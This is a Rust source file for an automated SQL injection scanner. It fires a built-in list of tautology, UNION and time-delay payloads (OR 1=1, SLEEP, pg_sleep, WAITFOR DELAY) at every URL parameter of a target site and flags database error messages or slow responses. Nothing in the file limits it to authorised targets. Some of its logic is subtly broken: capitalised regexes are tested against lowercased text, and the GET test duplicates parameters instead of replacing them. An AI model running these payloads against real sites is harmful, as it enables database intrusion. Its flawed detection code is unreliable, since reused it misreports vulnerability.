use reqwest::Client;
use regex::Regex;
use url::Url;
use std::time::{Duration, Instant};
use std::collections::HashMap;
use futures::future::join_all;
use tokio::sync::Mutex;
use std::sync::Arc;

#[derive(Debug, Clone)]
pub struct ParameterResult {
    pub parameter: String,
    pub vulnerable: bool,
    pub payloads_tested: Vec<String>,
    pub errors_found: Vec<ErrorFound>,
    pub response_times: Vec<f64>,
}

#[derive(Debug, Clone)]
pub struct ErrorFound {
    pub payload: String,
    pub error_pattern: String,
    pub response_time: f64,
}

#[derive(Debug, Clone)]
pub struct ScanResults {
    pub url: String,
    pub method: String,
    pub parameters_tested: Vec<ParameterResult>,
    pub vulnerable: bool,
    pub vulnerable_parameters: Vec<String>,
}

pub struct SQLInjectionScanner {
    client: Client,
    timeout: Duration,
    max_threads: usize,
    verbose: bool,
    payloads: Vec<String>,
    error_patterns: Vec<Regex>,
}

impl SQLInjectionScanner {
    pub fn new(timeout: Duration, max_threads: usize, verbose: bool) -> Self {
        let client = Client::builder()
            .timeout(timeout)
            .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .build()
            .expect("Failed to build HTTP client");

        let payloads = vec![
            "'".to_string(),
            "''".to_string(),
            "' OR '1'='1".to_string(),
            "' OR '1'='1' --".to_string(),
            "' OR '1'='1' /*".to_string(),
            "' OR 1=1--".to_string(),
            "' OR 1=1#".to_string(),
            "' OR 1=1/*".to_string(),
            "') OR '1'='1--".to_string(),
            "') OR ('1'='1--".to_string(),
            "1' OR '1'='1".to_string(),
            "1' OR 1 -- -".to_string(),
            "1' OR 1=1--".to_string(),
            "1' OR 1=1#".to_string(),
            "1' OR 1=1/*".to_string(),
            "1' UNION SELECT NULL--".to_string(),
            "1' AND (SELECT COUNT(*) FROM users) > 0--".to_string(),
            "1' AND 1=1--".to_string(),
            "1' AND 1=2--".to_string(),
            "'; WAITFOR DELAY '0:0:5'--".to_string(),
            "'; WAITFOR DELAY '0:0:10'--".to_string(),
            "' OR SLEEP(5)--".to_string(),
            "' OR SLEEP(10)--".to_string(),
            "1' OR SLEEP(5)--".to_string(),
            "1' OR SLEEP(10)--".to_string(),
            "' OR pg_sleep(5)--".to_string(),
            "' OR pg_sleep(10)--".to_string(),
            "'; SELECT pg_sleep(5)--".to_string(),
            "'; SELECT pg_sleep(10)--".to_string(),
        ];

        let error_patterns = vec![
            // MySQL
            Regex::new(r"SQL syntax.*MySQL").unwrap(),
            Regex::new(r"Warning.*mysql_.*").unwrap(),
            Regex::new(r"valid MySQL result").unwrap(),
            Regex::new(r"MySqlClient\.").unwrap(),
            // PostgreSQL
            Regex::new(r"PostgreSQL.*ERROR").unwrap(),
            Regex::new(r"Warning.*pg_.*").unwrap(),
            Regex::new(r"valid PostgreSQL result").unwrap(),
            Regex::new(r"Npgsql\.").unwrap(),
            // MS SQL Server
            Regex::new(r"Driver.* SQL.*Server").unwrap(),
            Regex::new(r"OLE DB.* SQL Server").unwrap(),
            Regex::new(r"(\W|\A)SQL.*Server.*Driver").unwrap(),
            Regex::new(r"Warning.*mssql_.*").unwrap(),
            Regex::new(r"(\W|\A)SQL.*Server.*[0-9a-fA-F]{8}").unwrap(),
            // Oracle
            Regex::new(r"Exception.*Oracle").unwrap(),
            Regex::new(r"Oracle error").unwrap(),
            Regex::new(r"Oracle.*Driver").unwrap(),
            Regex::new(r"Warning.*oci_.*").unwrap(),
            Regex::new(r"Warning.*ora_.*").unwrap(),
            // IBM DB2
            Regex::new(r"CLI Driver.*DB2").unwrap(),
            Regex::new(r"DB2 SQL error").unwrap(),
            Regex::new(r"(\W|\A)db2_.*").unwrap(),
            // SQLite
            Regex::new(r"SQLite/JDBCDriver").unwrap(),
            Regex::new(r"SQLite.*Driver").unwrap(),
            Regex::new(r"Warning.*sqlite_.*").unwrap(),
            Regex::new(r"Warning.*SQLite3::").unwrap(),
            Regex::new(r"\[SQLite_ERROR\]").unwrap(),
            // Generic SQL
            Regex::new(r"SQL.*Driver").unwrap(),
            Regex::new(r"SQL.*ERROR").unwrap(),
            Regex::new(r"SQL.*Warning").unwrap(),
            Regex::new(r"SQL.*Exception").unwrap(),
            Regex::new(r"error.*SQL.*syntax").unwrap(),
            Regex::new(r"Unknown column").unwrap(),
            Regex::new(r"Unknown table").unwrap(),
            Regex::new(r"Invalid SQL").unwrap(),
            Regex::new(r"SQL injection").unwrap(),
            Regex::new(r"database error").unwrap(),
            Regex::new(r"db error").unwrap(),
            Regex::new(r"sql error").unwrap(),
        ];

        Self {
            client,
            timeout,
            max_threads,
            verbose,
            payloads,
            error_patterns,
        }
    }

    pub async fn scan_url(&self, url: &str, method: &str) -> Result<ScanResults, Box<dyn std::error::Error>> {
        println!("[*] Scanning URL: {}", url);
        
        // Extract parameters from URL
        let parameters = self.extract_parameters(url)?;
        
        if parameters.is_empty() {
            println!("[!] No parameters found in URL");
            return Ok(ScanResults {
                url: url.to_string(),
                method: method.to_string(),
                parameters_tested: vec![],
                vulnerable: false,
                vulnerable_parameters: vec![],
            });
        }
        
        println!("[*] Found {} parameter(s): {}", parameters.len(), parameters.join(", "));
        
        let mut results = ScanResults {
            url: url.to_string(),
            method: method.to_string(),
            parameters_tested: vec![],
            vulnerable: false,
            vulnerable_parameters: vec![],
        };

        // Test each parameter concurrently
        let semaphore = Arc::new(tokio::sync::Semaphore::new(self.max_threads));
        let mut tasks = vec![];

        for param in &parameters {
            let scanner = self.clone();
            let url = url.to_string();
            let param = param.clone();
            let method = method.to_string();
            let semaphore = semaphore.clone();
            
            let task = tokio::spawn(async move {
                let _permit = semaphore.acquire().await.unwrap();
                scanner.test_parameter(&url, &param, &method).await
            });
            
            tasks.push(task);
        }

        // Collect results
        for task in tasks {
            match task.await {
                Ok(param_result) => {
                    if param_result.vulnerable {
                        results.vulnerable = true;
                        results.vulnerable_parameters.push(param_result.parameter.clone());
                    }
                    results.parameters_tested.push(param_result);
                }
                Err(e) => {
                    eprintln!("[!] Error testing parameter: {}", e);
                }
            }
        }

        Ok(results)
    }

    async fn test_parameter(&self, url: &str, param: &str, method: &str) -> ParameterResult {
        let mut result = ParameterResult {
            parameter: param.to_string(),
            vulnerable: false,
            payloads_tested: vec![],
            errors_found: vec![],
            response_times: vec![],
        };

        for payload in &self.payloads {
            let start_time = Instant::now();
            
            let test_result = match method {
                "GET" => self.test_get_parameter(url, param, payload).await,
                "POST" => self.test_post_parameter(url, param, payload).await,
                _ => continue,
            };

            let response_time = start_time.elapsed().as_secs_f64();
            result.response_times.push(response_time);

            match test_result {
                Ok(response_text) => {
                    // Check for SQL errors in response
                    let response_lower = response_text.to_lowercase();
                    for pattern in &self.error_patterns {
                        if pattern.is_match(&response_lower) {
                            result.errors_found.push(ErrorFound {
                                payload: payload.clone(),
                                error_pattern: pattern.as_str().to_string(),
                                response_time,
                            });
                            result.vulnerable = true;
                        }
                    }

                    // Check for time-based blind SQL injection
                    if response_time > 5.0 {
                        result.errors_found.push(ErrorFound {
                            payload: payload.clone(),
                            error_pattern: "Time-based blind SQL injection (response time > 5s)".to_string(),
                            response_time,
                        });
                        result.vulnerable = true;
                    }
                }
                Err(e) => {
                    if self.verbose {
                        eprintln!("[!] Request failed for payload '{}': {}", payload, e);
                    }
                    continue;
                }
            }

            result.payloads_tested.push(payload.clone());
        }

        result
    }

    async fn test_get_parameter(&self, url: &str, param: &str, payload: &str) -> Result<String, reqwest::Error> {
        let separator = if url.contains('?') { '&' } else { '?' };
        let encoded_payload = urlencoding::encode(payload);
        let test_url = format!("{}{}{}={}", url, separator, param, encoded_payload);
        
        let response = self.client.get(&test_url).send().await?;
        response.text().await
    }

    async fn test_post_parameter(&self, url: &str, param: &str, payload: &str) -> Result<String, reqwest::Error> {
        let mut params = HashMap::new();
        params.insert(param, payload);
        
        let response = self.client.post(url).form(&params).send().await?;
        response.text().await
    }

    fn extract_parameters(&self, url: &str) -> Result<Vec<String>, Box<dyn std::error::Error>> {
        let parsed_url = Url::parse(url)?;
        let query_pairs = parsed_url.query_pairs();
        let mut parameters = Vec::new();
        
        for (key, _) in query_pairs {
            if !parameters.contains(&key.to_string()) {
                parameters.push(key.to_string());
            }
        }
        
        Ok(parameters)
    }
}

impl Clone for SQLInjectionScanner {
    fn clone(&self) -> Self {
        Self {
            client: self.client.clone(),
            timeout: self.timeout,
            max_threads: self.max_threads,
            verbose: self.verbose,
            payloads: self.payloads.clone(),
            error_patterns: self.error_patterns.clone(),
        }
    }
}